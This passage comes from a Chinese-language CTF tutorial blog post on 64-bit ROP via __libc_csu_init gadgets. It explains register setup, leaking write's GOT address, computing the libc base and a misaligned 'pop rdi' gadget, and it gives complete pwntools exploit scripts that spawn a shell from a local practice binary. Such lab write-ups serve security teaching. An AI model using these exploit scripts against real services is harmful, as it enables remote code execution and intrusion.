+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx  <span class="comment">//rbx-&gt;0</span></span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp  <span class="comment">//rbp-&gt;1</span></span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12  <span class="comment">//r12-&gt;write_got函数地址</span></span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13  <span class="comment">//r13-&gt;8</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14  <span class="comment">//r14-&gt;write_got函数地址</span></span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15  <span class="comment">//r15-&gt;1</span></span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn         <span class="comment">//覆盖为mov_addr</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>解释一下payload中两个write_got函数的作用：<br>再布置完寄存器后，由于有 call qword ptr [r12+rbx*8]它调用了write函数，其参数为write_got函数地址（r14寄存器，动调一下就知道了），写成C语言类似于：write(write_got函数地址)&#x3D;&#x3D;printf（write_got函数地址），再使用u64(p.recv(8))接受数据并print出来就行了</p>
+</blockquote>
+<p>之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13  <span class="comment">//rdx==r13==8</span></span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14  <span class="comment">//rsi==r14==write_got函数地址</span></span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d <span class="comment">//edi==r15d==1</span></span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>] <span class="comment">//call write_got函数地址 </span></span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp <span class="comment">//rbx==1,rbp==1</span></span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移。</p>
+</blockquote>
+<p>这里rbx和rbp都等于1，他们相等，所以继续执行payload代码（main_addr）,而不是去执行loc_400600</p>
+<blockquote>
+<p>从整体上来看，我们输入了 ‘A’<em>136，利用payload0对寄存器布局之后又重新回到了main函数<br>再说说’a’</em>(0x8+8*6)的作用：它的作用就是为了平衡堆栈<br>也就是说，当mov_addr执行完之后，按照流程仍然会执行地址400616处的函数，我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充），如下图所示：<br><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597125587373-dea568b1-820b-4230-bbde-056fb8a05ded.png" alt="QQ截图20200811135937.png"><br>用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p>
+</blockquote>
+<p>第一部分的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这道题目我们使用系统中自带的libc.so.6文件<br>请注意：当程序加载的时候会寻找同目录下的libc.so.6文件，如果存在，则会自动加载，而不会去加载系统自带的libc文件</p>
+</blockquote>
+<p>这样，我们就获得了write函数真实地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当我们获得write函数的真实地址之后，就可以计算出libc文件的基址，从而可以计算出system函数和&#x2F;bin&#x2F;sh字符串在内存中的地址，从而利用它。</p>
+<p>接下来解释一下第二个payload的意思：</p>
+<blockquote>
+<p>payload&#x3D;’a’*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</p>
+</blockquote>
+<p>当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_rdi_ret。</p>
+<blockquote>
+<p>请注意，当我们send payload之后，pop_rdi_ret、binsh和system_addr被送到了栈中，利用gadgets：pop rdi;ret 将栈中的binsh地址送往rdi寄存器中（也就是说pop_rdi_ret的参数是地址binsh），然后将system函数地址覆盖到ret，程序就会执行此system函数。<br>当system函数执行的时候会利用到rdi里的参数，动态调试一下就知道了。</p>
+</blockquote>
+<p>完整的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597126888175-50a79803-9a61-4bea-8bce-17ee825d022e.png" alt="QQ截图20200811142109.png"></p>
+<p>getshell</p>
+<p>但你是否注意到了pop_rdi_ret的地址0x400623在IDA中不存在？</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597121195240-cdbb68cc-8124-4077-a359-d0220c1403c4.png" alt="QQ截图20200811124624.png"></p>
+<p>我们先来看一下csu_init的结尾几个pop的机器码：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597121458348-cb0364b6-0459-4810-b291-492d5c6d2163.png" alt="QQ截图20200811125050.png"></p>
+<p>pop rbx———&gt;5B</p>
+<p>pop rbp———&gt;5D</p>
+<p>pop r12———-&gt;41 5C</p>
+<p>pop r13———-&gt;41 5D</p>
+<p>pop r14———-&gt;41 5E</p>
+<p>pop r15———-&gt;41 5F</p>
+<p>是不是感觉很有规律？</p>
+<p>机器码就是有规律的，而这个规律我们在这可以巧妙地利用起来</p>
+<p>查手册（或者IDA之类的改一下机器码）得到5F是pop rdi</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597121560710-3c122b7d-bc44-4372-aa3b-f7d358e5866e.png" alt="QQ截图20200811125231.png"></p>
+<p>那么看上面最后：0x400622 pop r15———-&gt;41 5F</p>
+<p>如果我们+1，就会变成：0x400623 pop rdi———-&gt;5F</p>
+<p>也就是说这些东西（gadgets）是可以凑出来的，我们可以使用工具来看一下：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597121810024-76abeafb-e461-435d-a784-6ba1b248f51e.png" alt="QQ截图20200811125641.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-04/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-8%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2reg/" title="PWN入门（1-3-8）-中级ROP-ret2reg"><img class="cover" src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN入门（1-3-8）-中级ROP-ret2reg</div></div><div class="info-2"><div class="info-item-1">PWN入门（1-3-8）-中级ROP-ret2reg 摘自：https://blog.csdn.net/acsuccess/article/details/104465113https://blog.csdn.net/linyt/article/details/43612409  前面介绍的攻击方法，EIP注入的地址必须是一个确定地址，否则无法攻击成功，为了与本文介绍的攻击方法形成比对，我将前面的方法称为ret2addr（return-to-address，返回到确定地址执行的攻击方法）。 安全人员为保护免受ret2addr攻击，想到了一个办法，那就是地址混淆技术。该述语英文称为 Address Space Layout Randomization，直译为地址随机化。该技术将栈，堆和动态库空间全部随机化。在32位系统上，随机量在64M范围；而在64位系统，它的随机量在2G范围，因此原来的ret2addr技术无法攻击成功。 很快攻击者想到另一种攻击方法ret2reg，即return-to-register，返回到寄存地址执行 的攻击方法。 此攻击方法之所以能成功，是因为函数内部实现...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/" title="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）"><img class="cover" src="https://picsum.photos/seed/blog-cover-05/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无_bin_sh）</div></div><div class="info-2"><div class="info-item-1">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh） 示例：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3参考资料：https://blog.csdn.net/qq_41918771&#x2F;article&#x2F;details&#x2F;90665950https://wiki.x10sec.org/pwn/stackoverflow/basic_rop&#x2F;#3  将文件下载下来，检查一下文件保护：  32位程序，只开启了栈上不可执行保护。 扔到IDA中：  计算栈偏移，可以得到为112（略），在IDA里看一下，并没有发现system函数和&#x2F;bin&#x2F;sh字符串的身影。 现在当务之急就是得到system函数的地址，那么我们如何得到呢？这里就主要利用了两个知识点：  system 函数属于 libc，而 libc.so 动态链接库中的函数之间相...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2-libc-csu-init%EF%BC%8864%E4%BD%8DELF%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i 